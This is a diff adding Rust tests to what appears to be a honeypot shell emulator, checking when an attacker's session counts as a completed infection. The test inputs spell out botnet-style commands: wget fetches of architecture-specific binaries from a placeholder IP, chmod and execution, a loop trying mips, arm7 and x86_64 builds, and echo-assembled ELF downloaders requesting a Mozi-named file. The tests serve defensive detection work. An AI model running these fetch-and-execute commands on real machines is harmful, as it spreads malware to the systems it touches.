@@ -479,3 +479,127 @@ fn a_directory_search_path_or_missing_file_is_unchanged() {
     assert_eq!(answer(&mut sh, "./c").2, 126);
     assert_eq!(answer(&mut sh, "./c").1, "-bash: ./c: Permission denied\n");
 }
+
+/// An x86-64 ELF header through `e_machine`, as `echo -ne` takes it.
+const ELF_HEAD: &str = r"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00";
+
+#[test]
+fn a_fetched_file_that_runs_natively_completes_the_infection() {
+    let mut sh = ubuntu();
+    assert!(!sh.infection_completed());
+    answer(
+        &mut sh,
+        "wget -q http://198.51.100.9/bins/x86_64 -O c; chmod +x c",
+    );
+    assert!(
+        !sh.infection_completed(),
+        "fetched and made executable only"
+    );
+    assert_eq!(answer(&mut sh, "./c").2, 0);
+    assert!(sh.infection_completed());
+}
+
+#[test]
+fn a_build_for_another_cpu_does_not_complete_it_but_the_native_one_in_the_loop_does() {
+    let mut sh = ubuntu();
+    answer(
+        &mut sh,
+        "wget -q http://198.51.100.9/bins/mips -O c; chmod +x c",
+    );
+    assert_eq!(answer(&mut sh, "./c").2, 126);
+    assert!(!sh.infection_completed(), "Exec format error");
+    answer(
+        &mut sh,
+        "for a in mips arm7 x86_64; do wget -q http://198.51.100.9/bins/$a -O .c; \
+         chmod +x .c; ./.c && break; done",
+    );
+    assert!(
+        sh.infection_completed(),
+        "the loop reached the native build"
+    );
+}
+
+#[test]
+fn a_download_that_is_never_run_completes_nothing() {
+    let mut sh = ubuntu();
+    answer(
+        &mut sh,
+        "wget -q http://198.51.100.9/bins/x86_64 -O c; chmod 777 c; curl -s http://198.51.100.9/y -o d",
+    );
+    assert!(!sh.infection_completed());
+}
+
+#[test]
+fn a_fetch_that_was_refused_or_overwritten_completes_nothing() {
+    let mut sh = ubuntu();
+    // Not executable: the shell refuses before anything runs.
+    answer(&mut sh, "wget -q http://198.51.100.9/bins/x86_64 -O c");
+    assert_eq!(answer(&mut sh, "./c").2, 126);
+    // A typed script written over the fetched file has no origin left.
+    answer(&mut sh, "echo hi > c; chmod +x c");
+    assert_eq!(answer(&mut sh, "./c").2, 0);
+    assert!(!sh.infection_completed());
+}
+
+#[test]
+fn a_script_typed_in_one_echo_is_a_probe_not_an_infection() {
+    let mut sh = ubuntu();
+    answer(&mut sh, "echo 'echo hi' > .t; chmod +x .t");
+    assert_eq!(answer(&mut sh, "./.t").2, 0);
+    assert!(!sh.infection_completed());
+}
+
+#[test]
+fn an_assembled_program_that_runs_natively_completes_it_with_one_chunk_or_many() {
+    let mut chunked = ubuntu();
+    answer(&mut chunked, &format!("echo -ne '{ELF_HEAD}' > .i"));
+    answer(&mut chunked, "echo -ne 'abcdef' >> .i; chmod 777 .i");
+    assert!(!chunked.infection_completed());
+    assert_eq!(answer(&mut chunked, "./.i").2, 0);
+    assert!(chunked.infection_completed());
+
+    let mut single = ubuntu();
+    answer(
+        &mut single,
+        &format!("echo -ne '{ELF_HEAD}abc' > .i; chmod 777 .i"),
+    );
+    assert_eq!(answer(&mut single, "./.i").2, 0);
+    assert!(single.infection_completed());
+
+    let mut two_writes = ubuntu();
+    answer(
+        &mut two_writes,
+        "echo 'one' > .s; echo 'two' >> .s; chmod 777 .s",
+    );
+    assert_eq!(answer(&mut two_writes, "./.s").2, 0);
+    assert!(
+        two_writes.infection_completed(),
+        "built by more than one write"
+    );
+}
+
+#[test]
+fn an_assembled_downloader_that_cannot_reach_its_server_has_not_infected_anything() {
+    let mut sh = ubuntu();
+    let mut image = String::from(ELF_HEAD);
+    image.push_str(r"GET /Mozi.6 HTTP/1.0\r\n\r\n");
+    answer(&mut sh, &format!("echo -ne '{image}' > .i; chmod 777 .i"));
+    assert_eq!(answer(&mut sh, "./.i 198 51 100 23 3912").2, 1);
+    assert!(!sh.infection_completed());
+}
+
+#[test]
+fn a_line_that_is_undone_for_its_input_does_not_leave_the_infection_behind() {
+    let mut sh = ubuntu();
+    answer(
+        &mut sh,
+        "wget -q http://198.51.100.9/bins/x86_64 -O c; chmod +x c",
+    );
+    // `./c; cat > f` waits for terminal input: the run is undone and redone on the input.
+    let (step, _) = sh.start_line("./c; cat > f");
+    assert!(matches!(step, super::LineStep::AwaitingInput));
+    assert!(
+        !sh.infection_completed(),
+        "undone with the rest of the line"
+    );
+}
